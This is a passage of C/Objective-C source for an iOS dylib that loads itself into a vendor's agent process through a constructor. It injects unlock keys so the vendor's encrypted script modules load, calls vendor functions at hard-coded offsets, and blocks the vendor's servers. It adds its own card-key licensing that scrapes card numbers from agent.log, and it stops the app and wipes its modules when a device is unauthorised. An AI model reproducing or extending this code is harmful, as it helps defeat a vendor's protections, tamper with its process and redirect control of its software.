        if (stat(DATA_DIR "/log/agent.log", &lst) == 0 && lst.st_size > 0) {
            long rd = (lst.st_size > 65536) ? 65536 : (long)lst.st_size;
            FILE *lf = fopen(DATA_DIR "/log/agent.log", "rb");
            const char *hit = NULL;
            if (lf) {
                int ok = (fseek(lf, lst.st_size - rd, SEEK_SET) == 0);
                if (ok) {
                    char *buf = malloc((size_t)rd + 1);
                    if (buf) {
                        size_t got = fread(buf, 1, (size_t)rd, lf);
                        buf[got] = 0;
                        const char *sig = "begin process activate card!";
                        const char *p   = buf;
                        while ((p = strstr(p, sig)) != NULL) { hit = p; p += 8; }
                        if (hit) {
                            const char *cl = strchr(hit, '\n');
                            if (cl) {
                                cl++;                       // 卡号行首
                                // ★ v6.23t：解析行首 "[YYYY/MM/DD HH:MM:SS] " —— 用于区分
                                //   「真重新输入」（时间戳晚于被踢时刻）与「日志残留兜底」。
                                long evt_ts = 0;
                                if (cl[0] == '[') {
                                    int Y=0,Mo=0,D=0,h=0,mi=0,se=0;
                                    if (sscanf(cl, "[%d/%d/%d %d:%d:%d]",
                                               &Y,&Mo,&D,&h,&mi,&se) == 6) {
                                        struct tm tmv;
                                        memset(&tmv, 0, sizeof(tmv));
                                        tmv.tm_year = Y - 1900; tmv.tm_mon = Mo - 1;
                                        tmv.tm_mday = D; tmv.tm_hour = h;
                                        tmv.tm_min  = mi; tmv.tm_sec = se;
                                        evt_ts = (long)mktime(&tmv);
                                    }
                                }
                                size_t cn = 0;
                                while (cl[cn] && cl[cn] != '\n' && cl[cn] != '\r') cn++;
                                // ★ v6.21c：卡号 = 行内**末尾连续** [0-9A-Z] 段。
                                //   实测（.45 02:16 od）厂商在卡号行前**也打了时间戳
                                //   前缀** "[2026/10/03 02:16:31] "，整行 49B 直接
                                //   校验必挂（v6.21/v6.21b 静默失效的真根因）。
                                size_t end = cn;
                                while (end > 0 &&
                                       !((cl[end-1] >= '0' && cl[end-1] <= '9') ||
                                         (cl[end-1] >= 'A' && cl[end-1] <= 'Z'))) end--;
                                size_t beg = end;
                                while (beg > 0 &&
                                       (((cl[beg-1] >= '0' && cl[beg-1] <= '9')) ||
                                        ((cl[beg-1] >= 'A' && cl[beg-1] <= 'Z')))) beg--;
                                size_t klen = end - beg;
                                if (klen >= 8 && klen <= 40) {
                                    // ★ v6.23t：卡号相同但时间戳更新 = 又重新输了一次同一张卡
                                    //   （尾部扫描无 offset，每 tick 都命中同一行 —— 时间戳不变
                                    //   故不会反复刷日志）。旧条件只看卡号变化，会漏掉这个场景。
                                    int is_new = (strncmp(lg_card, cl + beg, klen) != 0 ||
                                                  lg_card[klen]);
                                    int ts_new = (evt_ts > 0 && evt_ts > lg_ts);
                                    if (is_new || ts_new) {
                                        if (is_new)
                                            snprintf(lg_card, sizeof(lg_card), "%.*s",
                                                     (int)klen, cl + beg);
                                        lg_ts = evt_ts;              // ★ v6.23t
                                        bs_log("[card] captured from agent.log: %.32s (ts=%ld)",
                                               lg_card, lg_ts);
                                    }
                                }
                            }
                        }
                        free(buf);
                    }
                }
                fclose(lf);
                if (!lg_seen) {
                    lg_seen = 1;
                    bs_log("[card] tail scan init ok (size=%ld hit=%s)",
                           (long)lst.st_size, hit ? "yes" : "no");
                }
            }
        }

        // ---- 读当前卡密（★ v6.21 卡源优先级：内存 getter > 日志捕获 > conf cardval） ----
        char card[80] = {0};
        if (fn_get_card) {
            char *p = fn_get_card();
            if (p) snprintf(card, sizeof(card), "%s", p);
        } else if (gbuf) {
            snprintf(card, sizeof(card), "%s", (const char *)gbuf);
        }

        int have_card = card[0] != 0;
        if (!have_card && lg_card[0]) {
            snprintf(card, sizeof(card), "%s", lg_card);      // v6.21：日志捕获兜底
            have_card = 1;
        }
        if (!have_card && g_cardval[0]) {
            snprintf(card, sizeof(card), "%s", g_cardval);    // v6.21：conf 手动卡兜底
            have_card = 1;
        }
        if (!have_card && g_card_cur[0]) {
            // ★ v6.23f：缓存卡兜底。重启后厂商内存卡清空、日志截断、无 cardval
            //   时，否则心跳永不发出（脱机永动，拉黑/冻结全部失效）。
            snprintf(card, sizeof(card), "%s", g_card_cur);
            have_card = 1;
            static int fb_logged = 0;
            if (!fb_logged) {
                fb_logged = 1;
                bs_log("[card] card source = cache fallback (%.24s...)", card);
            }
        }

        // ---- 卡密变化 → 立即激活（幂等；失败同卡 60s 节流重试） ----
        static char last_fail[80] = {0};
        static long last_try      = 0;
        // ★★★★ v6.47：运营**重新输入了本机当前那张卡**（卡值没变，进不了下面的
        //   「卡变化」分支）也要算冲突翻篇 —— .216 现场就是这样：撞了别人的卡留下
        //   冲突备注，运营改输回自己原来那张卡，中控备注却一直挂着「卡密冲突」。
        //   判据同样要 real_input（日志激活事件时间戳晚于撞卡时刻），日志残留不算。
        if (have_card && g_card_cur[0] && !strcmp(card, g_card_cur) &&
            (g_note_cf_card[0] || g_card_kicked[0])) {
            int own_reinput = (lg_card[0] && strcmp(card, lg_card) == 0 &&
                               lg_ts > 0 &&
                               lg_ts > (g_note_cf_ts > g_card_kickts ? g_note_cf_ts
                                                                     : g_card_kickts));
            if (own_reinput) {
                bs_log("[note] own card re-input after conflict -> clear flag on center");
                g_card_kicked[0] = 0;
                g_card_kickts    = 0;
                g_note_cf_card[0]= 0;
                g_note_cf_ts     = 0;
                g_note_cf_evt    = 0;
                g_note_cf_sent   = 0;
                g_note_force     = 1;
                bs_card_cache_save();
            }
        }
        if (have_card && strcmp(card, g_card_cur) != 0) {
            // ★ v6.23t：是否「真重新输入」—— 卡值来自日志捕获、且该激活事件的时间戳
            //   晚于被踢时刻。日志残留（旧行）时间戳必 ≤ kickts，不算真输入。
            int real_input = (lg_card[0] && strcmp(card, lg_card) == 0 &&
                              lg_ts > 0 && lg_ts > g_card_kickts);
            if (g_card_kicked[0] && strcmp(card, g_card_kicked) == 0 && !real_input) {
                // ★ v6.23s：被接管卡本地拉黑 —— 自动重试会以 act=new 抢回，
                //   与接管方 60s 心跳互踢振荡；静默等真输入（换卡或重启 App）。
                //
                // ★★★★ v6.42：**探活已移到下方独立段落**（见「拉黑冷却探活」）。
                //   为什么不能放这里：code=7 时 g_card_cur 与缓存卡号一起被清空，
                //   若厂商 getter 也返回空（假卡机 / 从未人工输卡的机），下一拍
                //   have_card=0，本整个「卡变化」分支根本不进 —— 探活挂在这里
                //   等于永远不触发（2026-10-29 .216 实测踩到，10 分钟零请求）。
                static long last_kick_log = 0;
                if (now - last_kick_log >= 300) {
                    last_kick_log = now;
                    bs_log("[card] taken over card %.20s... blacklisted, "
                           "waiting for new input", card);
                }
            } else {
            if (real_input && g_card_kicked[0] && strcmp(card, g_card_kicked) == 0) {
                g_card_kicked[0] = 0;               // ★ v6.23t 真输入 → 解除拉黑
                g_card_kickts    = 0;
                // ★ v6.47：这里**不再** g_note_force=1。它每拍都会命中（agent.log 尾部
                //   最后一条就是这张卡），force 会一直悬着把冲突备注冲成「正常」。
                //   备注侧翻篇只认三个真解除点：激活成功 / 探活恢复 / 重输本机原卡。
                bs_log("[card] newer input seen after kick -> unblock %.20s...", card);
            }
            int throttled = (last_fail[0] && !strcmp(card, last_fail) && now - last_try < 60);
            if (!throttled) {
                last_try = now;
                long rc = bs_card_login(card, 1);   // ★ v6.23s 激活带 act=new
                if (rc == 0) {
                    snprintf(g_card_cur, sizeof(g_card_cur), "%s", card);
                    last_fail[0] = 0;
                    g_card_kicked[0] = 0;           // ★ v6.23s 激活成功清拉黑
                    g_card_kickts    = 0;           // ★ v6.23t
                    // ★★★★ v6.47（用户拍板）：A 机撞过卡密冲突后，运营又输了一张
                    //   **没人绑定的卡** → 激活成功。中控备注里那条
                    //   「卡密冲突:xxx 已被其他设备占用」不会自己消失，必须立刻覆盖，
                    //   否则运营一直以为这台机还在冲突状态里，影响判断。
                    g_note_cf_card[0] = 0;          // 解除后允许下次冲突再报一次
                    g_note_cf_ts      = 0;
                    g_note_cf_evt     = 0;
                    g_note_cf_sent    = 0;
                    g_note_force      = 1;          // 15s 内把备注改成当前真实状态
                    bs_log("[note] conflict cleared by new card -> repush center note");
                    last_check       = now;         // ★ v6.42h 刚激活过，本拍不必再心跳
                    bs_card_cache_save();
                } else if (rc > 0) {
                    // 业务失败：记住这张失败卡（节流用）；若与已绑卡相同
                    // （可能被解绑/冻结）→ 清缓存封禁
                    snprintf(last_fail, sizeof(last_fail), "%s", card);
                    if (rc == 7) {
                        // ★ v6.23s：抢卡被拒 → 把这**张被抢的卡**拉黑，等真输入。
                        //
                        // ★★★★★ v6.44（2026-10-30 现场事故修正）：**不许再清
                        //   g_card_cur / g_card_expire / g_card_lastok。**
                        //   事故复现（.216）：本机原本绑定 SNAIL2VX6… 正常跑，
                        //   运营又输入了别人已绑的 SNAIL2K0…（act=new 被拒 code=7），
                        //   旧代码把本机**正在用的那张卡**一起清空 ⇒
                        //   [card] BLOCKED (verdict=invalid expire=0 lastok=0)
                        //   → OPER_STOP + 抹 3 个模块 → 中控「授权」直接掉成
                        //   「未授权」且到期列空白。实际自己那张卡毫发无伤。
                        //
                        //   v3.26 云端语义已从「卡被抢走」变成「抢不了、被拒」：
                        //   拒绝的是**这次请求**，不是本机的授权。所以：
                        //     · 只有 `card` 本来就是本机当前卡时，才谈得上失效
                        //       （那种情况归下方心跳分支的 code=7 处理）
                        //     · 否则本机当前卡始终有效 → 原样保留，心跳照跑
                        //   一句话：抢别人的卡失败，不该把自己的卡弄丢。
                        // ★ v6.47：只有「撞的是另一张卡」或「又真输了一次」（agent.log 出现了
                        //   新的激活事件时间戳）才算新一轮冲突 → 允许再报一次；同一次输入被
                        //   60s 节流反复重试时不再刷中控备注（用户要求只报一次）。
                        //   判据用 g_note_cf_*（备注专用记忆），不用 g_card_kicked
                        //   —— 后者会被日志扫描每拍清掉再写回，拿它比对必然「每次都新」。
                        int new_card = (!g_note_cf_card[0] || strcmp(g_note_cf_card, card) != 0);
                        int new_evt  = (lg_ts > 0 && lg_ts != g_note_cf_evt);
                        if (new_card || new_evt) {
                            snprintf(g_note_cf_card, sizeof(g_note_cf_card), "%s", card);
                            g_note_cf_ts   = now;
                            g_note_cf_evt  = lg_ts;
                            g_note_cf_sent = 0;
                            g_note_force   = 1;
                        } else if (!g_note_cf_sent) {
                            g_note_force   = 1;     // 第一次撞上（比如进程重启后）
                        }
                        snprintf(g_card_kicked, sizeof(g_card_kicked), "%s", card);
                        g_card_kickts = now;                    // ★ v6.23t 记录被抢时刻
                        int was_current = (g_card_cur[0] && !strcmp(card, g_card_cur));
                        bs_log("[card] already activated on another device, "
                               "refused (no auto-rebind): %.20s...%s", card,
                               (!was_current && g_card_cur[0])
                                   ? " -> keep current card, heartbeat unaffected"
                                   : "");
                        if (was_current) {
                            // 只有「本机当前卡」在别机被激活时才清（防互踢振荡）
                            g_card_cur[0] = 0;
                            g_card_expire = 0;
                            g_card_lastok = 0;
                        }
                        bs_card_cache_save();
                    } else if (g_card_cur[0] && strcmp(card, g_card_cur) == 0) {
                        g_card_cur[0] = 0;
                        g_card_expire = 0;
                        g_card_lastok = 0;
                        bs_card_cache_save();
                    } else {
                        // ★★★★ v6.42h：输入的是**另一张**卡且被拒（不存在 code=1 /
                        //   冻结 2 / 已过期 3 / 拉黑 6）—— 什么都不动，继续用当前卡。
                        //   现场语义：运营误输一张假卡，设备上正在跑的卡不该被牵连。
                        //   每分钟最多记一条，避免 3s 一拍刷满 8KB 设备日志窗口。
                        static long bad_log_min = 0;
                        if (bad_log_min != now / 60) {
                            bad_log_min = now / 60;
                            bs_log("[card] input rejected code=%ld -> keep current card "
                                   "%.20s... (heartbeat unaffected)",
                                   rc, g_card_cur[0] ? g_card_cur : "(none)");
                        }
                    }
                }
            }
            }
            // ★★★★ v6.42h：这里**不再**无条件 `last_check = now`。
            //   这是 2026-10-29 .216 桩测发现的真实连锁故障：
            //   运营在已授权设备上误输一张不存在的卡（code=1），agent.log 最后一条
            //   激活事件就变成那张假卡 → 本分支每拍都试图激活它，被 60s 节流；
            //   而旧代码每次（包括 throttled 后的空转）都把 last_check 刷成 now，
            //   60s < cardtick 120s ⇒ 下方心跳条件 `now - last_check >= 120`
            //   **永远不成立**，真卡心跳彻底停摆（桩日志 22:50:49 之后 3 分钟
            //   零次 SNAILTESTN 请求，只有假卡每 60s 撞一次）。
            //   后果：云端看该设备掉线、到期时间不再刷新；若服务端有「心跳超时
            //   解绑」类策略还会被误伤 —— 比「输错卡」本身危害大得多。
            //   修法：只有**激活成功**那一拍抑制心跳（见 rc==0 分支），失败/节流
            //   都不影响心跳计时。
        }

        // ---- 心跳：到点重发 login（在线状态 + 到期刷新） ----
        if (have_card && g_card_cur[0] && now - last_check >= g_cardtick) {
            long rc = bs_card_login(g_card_cur, 0);   // ★ v6.23s 心跳不带 act
            if (rc == 0) {
                bs_card_cache_save();
            } else if (rc > 0) {
                // ★ v6.23s：本机卡被其他设备接管（code=7）→ 拉黑+清卡，
                //   静默停脚本等新输入；与冻结/过期不同（那些保留 g_card_cur
                //   以便解冻后自动恢复），接管必须停试防互抢振荡
                if (rc == 7) {
                    snprintf(g_card_kicked, sizeof(g_card_kicked), "%s", g_card_cur);
                    g_card_kickts = now;                    // ★ v6.23t 记录被踢时刻
                    g_note_force  = 1;                      // ★ v6.47 状态突变，尽快反映到中控备注
                    bs_log("[card] taken over by another device, "
                           "blocked: %.20s...", g_card_cur);
                    g_card_cur[0] = 0;
                }
                // 心跳业务失败：卡被冻结/解绑/过期 → 立即封禁
                //
                // ★★★★ v6.42f：**已过期（code=3）保留到期时间戳**。
                //   用户 2026-10-29 拍板：中控「授权到期时间」列在卡过期时要显示
                //   「哪天过的期」，运营一眼能分清两种「未授权」：
                //     · 到期列有值 → 卡绑定过、已过期（该续费）
                //     · 到期列为空 → 从来没绑过卡 / 卡被删 / 被别的设备接管
                //   以前统一清 0，这两种情况在中控上长得一模一样。
                //
                //   ★ 必须同时清 lastok：下面的宽限判定是
                //     `now < lastok + cardgrace*3600` → verdict 1，
                //     宽限的语义是「网络抖动别误停」，不是「过期后再续命 grace 小时」。
                //     不清 lastok 的话，过期卡会被宽限重新判成 valid，中控又挂回
                //     「已授权」——正是本次要修的反面。
                //
                //   其余业务码仍清 0（1 不存在 / 2 冻结 / 5 冲突 / 6 拉黑 / 7 接管）：
                //   那些情况下「这张卡的到期时间」要么不存在要么已失效，留着是假信息。
                if (rc == 3) {
                    g_card_lastok = 0;              // 阻断宽限；expire 保留用于显示
                    if (g_card_expire > 0) {
                        static long exp_log = 0;    // 同一张卡的过期时间只打一次
                        if (exp_log != g_card_expire) {
                            exp_log = g_card_expire;
                            bs_log("[card] expired (code=3) -> keep valid_time=%ld for "
                                   "center display, auth=unauthorized", g_card_expire);
                        }
                    }
                } else {
                    g_card_expire = 0;
                    g_card_lastok = 0;
                }
                bs_card_cache_save();
            }
            last_check = now;
        }

        // ---- ★★★★ v6.42：拉黑冷却探活（**独立段落，不依赖 card 来源**） ----
        //   场景：卡在 A 机手上 → B 机输同卡 act=new 接管 → A 收 code=7 拉黑。
        //   之后管理员在云端把卡改绑回 A（或把 B 机换走），旧版 A 机因为拉黑着
        //   **一次都不再试**，只能人工换卡 / 重装 App 才活 —— 现场表现为
        //   「明明绑回来了，设备还是死不跑」。
        //   修法：每 cardtick×5（默认 ≥600s）发一次**不带 act 的探活心跳**：
        //     · 不带 act ⇒ 服务端不会改绑、不会与持有方互踢（bsmod v3.10 语义）
        //     · 仍 code=7 就继续拉黑（服务端只多一条 bind_conflict 留痕）
        //     · code=0 ⇒ 绑定已回到本机，就地解除拉黑恢复运行
        //   ★ 必须独立：code=7 会把 g_card_cur 与缓存卡号一起清空，若厂商 getter
        //     也返回空（假卡机 / 从未人工输卡的机），下一拍 have_card=0，上面的
        //     「卡变化」分支根本不进 —— 探活挂在那里等于永不触发（.216 实测）。
        if (g_card_kicked[0] && !g_card_cur[0]) {
            static long last_probe = 0;
            static long probe_log  = 0;
            long probe_gap = (long)g_cardtick * 5;
            if (probe_gap < 600) probe_gap = 600;
            if (now - last_probe >= probe_gap) {
                last_probe = now;
                long prc = bs_card_login(g_card_kicked, 0);   // ★ 不带 act：只探不改绑
                if (prc == 0) {
                    snprintf(g_card_cur, sizeof(g_card_cur), "%s", g_card_kicked);
                    g_card_kicked[0] = 0;
                    g_card_kickts    = 0;
                    g_note_cf_card[0] = 0;      // ★ v6.47 冲突解除 → 允许下轮再报
                    g_note_cf_ts      = 0;
                    g_note_cf_evt     = 0;
                    g_note_cf_sent    = 0;
                    g_note_force      = 1;      // ★ v6.47 尽快把中控备注改回真实状态
                    bs_card_cache_save();
                    bs_log("[card] blacklisted card re-bound on server -> "
                           "recovered %.20s...", g_card_cur);
                    last_check = now;
                }
            }
            // ★★★★ v6.42c：探活成功那一拍 g_card_kicked 已在本块内被清空，
            //   若这里不复查，会在 recovered 之后紧跟着再打一行 "waiting for
            //   new input or server re-bind" —— 现场看日志像「没恢复」，与上一行
            //   recovered 自相矛盾（2026-10-29 .216 实测）。加 g_card_kicked[0] 复查。
            if (g_card_kicked[0] && now - probe_log >= 300) {
                probe_log = now;
                bs_log("[card] blacklisted %.20s... waiting for new input or server re-bind (probe %lds)",
                       g_card_kicked, probe_gap);
            }
        }

        // ---- 判决 ----
        // ★ v6.22：每 tick 把真实到期同步给厂商全局（中控显示一致性，自愈校准）
        bs_sync_vendor_expire();
        // 有效 = 已激活成功 且 未过到期时间
        int verdict_ok = 0;
        if (g_card_cur[0] && g_card_expire > 0 && now < g_card_expire) verdict_ok = 1;
        // 宽限：之前有效，只是网络不通（ expire 未知变化时保留 last_ok）
        if (!verdict_ok && g_card_expire > 0 && g_card_lastok > 0 &&
            now < g_card_lastok + (long)g_cardgrace * 3600) verdict_ok = 1;

        // 从未激活过 & 没有卡 → 封禁（cardcheck=1 的设备必须先输卡）
        //
        // ★★★★ v6.42：设备码 PENDING 期间**不否决** —— v6.41 起 bs_card_login 在
        //   devid 为空时直接 return -1（绝不上报空 device_id），此时本机根本没拿到
        //   任何服务端裁决。把「没裁决」当成「卡无效」是误判：一次正常冷启
        //   （Agent 尚未收到服务端下发的设备码，通常几十秒窗口）就会被判 BLOCKED
        //   → OPER_STOP + 每 3s 抹模块 → 下次运行必撞 bs_module_lost。
        //   处理：保持上一拍状态（首拍不封）；仅当持续 PENDING ≥600s 仍未拿到真值，
        //   才按正常判定走（防止设备码永久缺失导致卡密被无限期跳过）。
        int blocked;
        if (verdict_ok) {
            blocked    = 0;
            pend_since = 0;
        } else if (!g_card_devid[0]) {
            if (!pend_since) pend_since = now;
            if (now - pend_since < 600) {
                blocked = (prev_blocked < 0) ? 0 : prev_blocked;
                static int pd_logged = 0;
                if (!pd_logged) {
                    pd_logged = 1;
                    bs_log("[card] verdict HELD: device_id pending (no server "
                           "verdict yet, never block on unknown)");
                }
            } else {
                blocked = 1;
            }
        } else {
            blocked    = 1;
            pend_since = 0;
        }

        if (blocked != prev_blocked) {
            if (blocked) {
                bs_log("[card] BLOCKED (verdict=invalid expire=%ld lastok=%ld) -> OPER_STOP + gates + wipe",
                       g_card_expire, g_card_lastok);
                if (base)
                    ((void (*)(int))(base + FN_SET_OPER))(OPER_STOP);
            } else {
                bs_log("[card] re-authorized (expire=%ld) -> gates open", g_card_expire);
            }
            prev_blocked = blocked;
        }
        // ★ v6.23i：封禁期间每拍「清字典 + 抹本地模块」（v6.20 只拒新注入不够 ——
        //   字典里封禁前的旧模块还在，中控一点运行厂商照跑，.45 实测）。
        //   厂商/中控若重灌字典，下拍再清（onion dict wiped 日志即实证信号）。
        //   恢复全自动：卡重新有效 → pull 重下模块 → wd 重注入。
        if (blocked && base) {
            bs_wipe_onion_dict(base);
            int wiped = bs_wipe_local_modules();
            static int bw_logged = 0;
            if (!bw_logged && wiped > 0) {
                bw_logged = 1;
                bs_log("[card] blocked wipe: dict + %d local module file(s), every tick", wiped);
            }
        }
        g_card_blocked = blocked;

        // ★★★★ v6.42d：同步「授权」列（g_agent_auth_state）。
        //   · 传 verdict_ok 而非 blocked：verdict_ok 含宽限语义，与闸门完全同源，
        //     保证中控显示 = 脚本实际行为（不会「显示未授权但还在跑」）。
        //   · 设备码 PENDING 期间（g_card_devid 为空）跳过：那时根本没有服务端裁决，
        //     强写 1 会让一次正常冷启在中控闪几十秒「未授权」，观感上是故障。
        if (g_card_devid[0]) bs_sync_vendor_auth_state(verdict_ok);
    }
    return NULL;
}

static void *bs_bootstrap(void *arg) {
    // 等 dyld 与 ObjC 运行时彻底就绪再动手
    sleep(2);

    @autoreleasepool {
        // ★★★ v6.23v：App 进程分支 —— filter 扩到 App 后这里才会跑。
        //     只做「装后自动点启动服务」，其余 Agent 专属逻辑全部跳过。
        if (bs_proc_is_app()) {
            char asv[64];
            if (bs_autosvc_pending(asv, sizeof(asv))) {
                // ★ v6.24j：App 刚冷启（或从后台回到前台）时 UIWindow 还没建，
                //   as_tryTap 立即拿到 nil → 早期版本因「装了 dylib、App 也在跑」被
                //   dyld 共享缓存命中而不重新 load，as_kickoff 从不执行（.98 装 probe 包
                //   后续装不代启的实证）。这里改成：
                //     ① 先等 UI 就绪（最多 60s / 40 拍）再起点击定时器；
                //     ② 订阅 UIApplicationDidBecomeActiveNotification —— App 每次激活
                //        都重新 kickoff（.autosvc_pending 被消费后自然 no-op）。
                bs_log("[autosvc] pending marker (ver=%.24s) -> wait for UI then auto-tap start-service",
                       asv);
                for (int wi = 0; wi < 40; wi++) {
                    id appCls = NSClassFromString(@"UIApplication");
                    id app = appCls ? [(id)appCls sharedApplication] : nil;
                    if (app) {
                        NSArray *ws = [(id<BSAutoUI>)app windows];
                        if (ws && ws.count > 0) {
                            bs_log("[autosvc] UI ready after %.1fs (windows=%lu)",
                                   wi * 1.5, (unsigned long)ws.count);
                            break;
                        }
                    }
                    usleep(1500 * 1000);
                }
                [BSAutosvcHelper as_kickoff];
            } else {
                bs_log("[autosvc] no marker, App process idle (dylib loaded OK)");
            }
            return NULL;
        }

        g_base = bs_find_base();
        if (!g_base) {
            bs_log("agent image not found (count=%u)", _dyld_image_count());
            return NULL;
        }

        // 0) ★ v6.3：提前读 conf —— 密钥注入需要 host/port/token
        //    ★ v6.4：conf 里的 mode=probe 也在这里生效
        bs_load_conf();

        // ★★★ v6.4：probe 模式（真卡机只读雷达）—— 提前返回，不注入 / 不心跳 / 不拉模块。
        //    真机业务零改变，只多一个只读上报线程。
        if (g_mode == MODE_PROBE) {
            bs_log("★★★ PROBE mode: inject/watchdog/pull ALL skipped (read-only radar)");
            // ★★★ v6.37：probe 也「跟版」—— 只 GET /ver 拉最新 beta.so 落盘，不上传。
            //   · 落盘不重启：bs_so_maybe_reload 自 v6.24q 起只写 pend=1，不动运行态
            //     ⇒ 真卡机业务零改变（脚本下次手动运行时才自然加载新包）
            //   · key gate 走完整逻辑：包内每段版本键都要能取到才落盘，防「切了包没键
            //     → can not find version key!!」
            if (g_so_sync) {
                pthread_t tso;
                if (pthread_create(&tso, NULL, bs_so_sync_thread, NULL) == 0) {
                    pthread_detach(tso);
                    bs_log("[probe] pull-only follow ON: sotick=%ds first=%ds (no upload)",
                           g_so_tick, SO_SYNC_FIRST_DELAY);
                } else {
                    bs_log("probe so_sync thread create failed");
                }
            } else {
                bs_log("[probe] sosync=0 -> follow disabled (fully passive)");
            }
            pthread_t tpr;
            if (pthread_create(&tpr, NULL, bs_probe_thread, (void *)g_base) == 0) {
                pthread_detach(tpr);
            } else {
                bs_log("probe thread create failed");
            }
            return NULL;
        }

        // 1) ★ v6.3：解锁密钥注入；★ v6.5：语义变为「按版本幂等 + 合并」
        //    优先向服务端 GET /key（按本地 beta.so 版本查），失败回退内置 kKey/kVal。
        bs_inject_mh(g_base);
        // 1a) ★ v6.15：beta.so 是多记录容器 —— 记录1（脚本载荷）的 ver 恒为 020909，
        //     只注文件头版本（记录0 元数据版本）会让载荷记录无键 → 「加载运行库出错」。
        bs_ensure_payload_key(g_base);

        // 1a-2) ★ v6.24c：**同步预铺「全部段版本」密钥**。
        //   实测（10-17 .115 装 v1.56 后冷启）：中控在设备上线约 4s 就补发
        //   `run script msg`，而 verwatch 首拍要等 3s、逐版本 HTTP 再各约 80ms，
        //   于是 17:45:18 加载时只铺到 2 把（030100 base + 020909 payload），
        //   其余 7 把 17:45:19.7 才到 → `can not find version key!!`
        //   → `load snail module failed` → 中控该行显示「加载运行库出错」。
        //   在 init 阶段一次性铺完，把「键就绪」窗口从 ~6s 压到 ~1s，
        //   赶在中控下发 run 之前把键备齐。
        {
            int pv = bs_refresh_so_vers();
            for (int pi = 0; pi < pv; pi++) {
                char pvh[8];
                snprintf(pvh, sizeof(pvh), "%02x%02x%02x",
                         g_ek_vers[pi][0], g_ek_vers[pi][1], g_ek_vers[pi][2]);
                bs_ensure_extra_key(g_base, pvh, 1);   // bypass_throttle：首铺必取
            }
            if (pv > 0) bs_log("[mh] prewarm done, %d ver(s) ensured", pv);
        }

        // 1b) ★ v6.5：起版本哨兵 —— 3s 轮询 beta.so 版本，跃迁即补密钥
        pthread_t tv;
        if (pthread_create(&tv, NULL, bs_verwatch, (void *)g_base) == 0) {
            pthread_detach(tv);
        } else {
            bs_log("verwatch thread create failed");
        }

        // 1b-2) ★ v6.20：自有卡密系统 —— cardwatch（仅 unlock & cardcheck=1）
        if (g_cardcheck) {
            pthread_t tc;
            if (pthread_create(&tc, NULL, bs_cardwatch, (void *)g_base) == 0) {
                pthread_detach(tc);
            } else {
                bs_log("[card] cardwatch thread create failed");
            }
        } else {
            bs_log("[card] cardcheck=0 -> card watch disabled");
        }

        // 1c) ★ v6.6：起跟版线程 —— 主动问云端最新版本，比本地新就拉包落盘
        //     （probe 模式在上面的 early-return 已经走掉，不会到这里）
        if (g_so_sync) {
            pthread_t ts;
            if (pthread_create(&ts, NULL, bs_so_sync_thread, NULL) == 0) {
                pthread_detach(ts);
            } else {
                bs_log("so_sync thread create failed");
            }
        } else {
            bs_log("[so] sosync=0 -> sync thread NOT started");
        }

        // 2) 起看门狗（内部负责 v3 自愈 + v4 模块注入）
        bs_log("watchdog starting (base=%p state@%p run@%p oniondict@%p)",
               (void *)g_base, (void *)(g_base + OFF_STATE), (void *)(g_base + OFF_RUN),
               (void *)(g_base + OFF_ONION_DICT));
    }

    pthread_t th;
    if (pthread_create(&th, NULL, bs_watchdog, (void *)g_base) == 0) {
        pthread_detach(th);
    } else {
        bs_log("watchdog thread create failed");
    }

    // 3) ★ v5：起拉取线程（路线 A）
    //    bs_load_conf 已在步骤 0 提前调用（密钥注入要用 host/port/token）
    pthread_t tp;
    if (pthread_create(&tp, NULL, bs_puller, (void *)g_base) == 0) {
        pthread_detach(tp);
        bs_log("puller starting (port=%d tick=%ds)", g_port, g_tick);
    } else {
        bs_log("puller thread create failed");
    }
    return NULL;
}

__attribute__((constructor))
static void bs_entry(void) {
    // constructor 里只起线程，绝不碰 dyld/ObjC API
    pthread_t th;
    if (pthread_create(&th, NULL, bs_bootstrap, NULL) == 0) {
        pthread_detach(th);
    }
    // ★ v6.19：厂商服务器屏蔽 —— 独立线程尽早安装（赶在 Agent 首次外联前）
    pthread_t tb;
    if (pthread_create(&tb, NULL, bs_block_init, NULL) == 0) {
        pthread_detach(tb);
    }
}
